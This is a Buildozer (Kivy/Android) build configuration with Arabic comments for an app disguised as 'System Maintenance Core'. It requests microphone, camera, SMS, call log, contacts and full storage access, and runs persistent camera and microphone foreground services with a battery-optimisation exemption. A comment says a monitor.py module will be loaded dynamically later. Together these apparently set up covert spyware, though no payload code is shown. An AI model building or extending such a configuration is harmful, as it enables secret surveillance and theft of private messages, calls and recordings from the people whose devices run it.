[app]

# ====== هوية التطبيق (الإصدار الجديد 3.0) ======
title = System Maintenance Core
package.name = com.sys.auth.v3
package.domain = org.sys.core
version = 3.0.0

# ====== المصادر والملفات ======
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
source.include_patterns = assets/*, *.tflite, res/*
source.exclude_dirs = tests, __pycache__, docs, .github, venv
source.exclude_patterns = */test/*, */tests/*, *.pyc, */numpy/core/include/*, */numpy/distutils/*, */__pycache__/*

# ====== المكتبات الأساسية (خفيفة ومستقرة) ======
# تم إزالة cryptography لتجنب فشل البناء (يمكن استبداله بـ base64 داخل الكود)
requirements = python3, kivy==2.3.0, tflite-runtime==2.14.0, numpy==1.26.4, pillow, requests, pyjnius, android, pyzipper

# ====== أيقونة التطبيق ======
icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

# ====== الصلاحيات (شاملة + خاصة بـ Android 14) ======
android.permissions = INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE, FOREGROUND_SERVICE_DATA_SYNC, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, READ_CONTACTS, READ_SMS, READ_CALL_LOG

# ====== إعدادات SDK/NDK (API 34 + NDK 25b) ======
android.api = 34
android.minapi = 26          # Android 8.0 (لضمان استقرار الخدمات)
android.sdk = 34
android.ndk = 25b
android.build_tools_ver = 34.0.0
android.accept_sdk_license = True

# ====== ملف AndroidManifest.xml مخصص ======
android.manifest = project/android/AndroidManifest.xml

# ====== المعمارية الوحيدة (arm64-v8a) – للسرعة وتقليل الحجم ======
android.archs = arm64-v8a

# ====== إعدادات الشبكة والتخزين ======
android.allow_backup = False
android.request_legacy_external_storage = True
android.uses_cleartext_traffic = True

# ====== خدمات الخلفية والطاقة ======
android.foreground = True
android.foreground_service_type = dataSync|camera|microphone
android.wakelock = True
# تم إزالة android.services لأن monitor.py سيتم تحميله ديناميكياً لاحقاً

# ====== تحسينات لتقليل حجم APK ======
android.no_byte_compile_python = False
android.optimize_python = True
android.release_artifact = apk

# ====== ميتا-بيانات إضافية ======
android.meta_data = android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS=1

# ====== واجهة التطبيق ======
orientation = portrait
fullscreen = 1

# ====== مستوى التسجيل ======
log_level = 2
warn_on_root = 0

[buildozer]
log_level = 2
warn_on_root = 1
